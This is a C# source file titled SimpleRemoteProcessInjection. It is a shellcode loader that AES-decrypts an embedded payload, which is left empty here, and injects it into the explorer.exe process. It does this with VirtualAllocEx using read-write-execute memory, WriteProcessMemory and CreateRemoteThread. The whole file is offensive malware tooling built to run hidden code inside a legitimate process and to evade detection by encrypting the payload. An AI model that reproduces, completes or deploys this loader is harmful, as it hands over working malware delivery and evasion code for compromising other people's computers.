using System;
using System.Diagnostics;
using System.IO;
using System.Runtime.InteropServices;
using System.Security.Cryptography;

namespace SimpleRemoteProcessInjection
{
    internal class Program
    {
        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern IntPtr OpenProcess(
        uint processAccess,
        bool bInheritHandle,
        uint processId
        );

        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern bool WriteProcessMemory(
        IntPtr hProcess,
        IntPtr lpBaseAddress,
        byte[] lpBuffer,
        Int32 nSize,
        out IntPtr lpNumberOfBytesWritten);

        [DllImport("kernel32.dll")]
        static extern IntPtr CreateRemoteThread(IntPtr hProcess,
        IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress,
        IntPtr lpParameter, uint dwCreationFlags, out IntPtr lpThreadId);

        public const uint allAccess = 0x001F0FFF;
        public const uint commit = 0x00001000;
        public const uint reserve = 0x00002000;
        public const uint perw = 0x40;
        static void Main(string[] args)
        {
            byte[] Key = Convert.FromBase64String("UWvdzxNvawefjcAUkEQHeq==");
            byte[] IV = Convert.FromBase64String("WUcLtUFSRczMSaEHrdBBRD==");

            byte[] testy = new byte[] { };//ShellCode Aes Encrypted
            byte[] chelly = AESDecrypt(testy, Key, IV);

            //Get the process handle
            IntPtr gethproc = OpenProcess(allAccess, false, (uint)Process.GetProcessesByName("explorer")[0].Id);

            IntPtr getadd = VirtualAllocEx(gethproc, IntPtr.Zero, (uint)chelly.Length, commit | reserve, perw);

            IntPtr bytewrite;
            WriteProcessMemory(gethproc, getadd, chelly, chelly.Length, out bytewrite);

            IntPtr lThread = IntPtr.Zero;
            CreateRemoteThread(gethproc, IntPtr.Zero, (uint)chelly.Length, getadd, IntPtr.Zero, 0, out lThread);
        }

        private static byte[] AESDecrypt(byte[] CEncryptedShell, byte[] key, byte[] iv)
        {
            using (var aes = Aes.Create())
            {
                aes.KeySize = 128;
                aes.BlockSize = 128;
                aes.Padding = PaddingMode.PKCS7;
                aes.Mode = CipherMode.CBC;
                aes.Key = key;
                aes.IV = iv;

                using (var decryptor = aes.CreateDecryptor(aes.Key, aes.IV))
                {
                    return GetDecrypt(CEncryptedShell, decryptor);
                }
            }
        }
        private static byte[] GetDecrypt(byte[] data, ICryptoTransform cryptoTransform)
        {
            using (var ms = new MemoryStream())
            using (var cryptoStream = new CryptoStream(ms, cryptoTransform, CryptoStreamMode.Write))
            {
                cryptoStream.Write(data, 0, data.Length);
                cryptoStream.FlushFinalBlock();

                return ms.ToArray();
            }
        }
    }
}
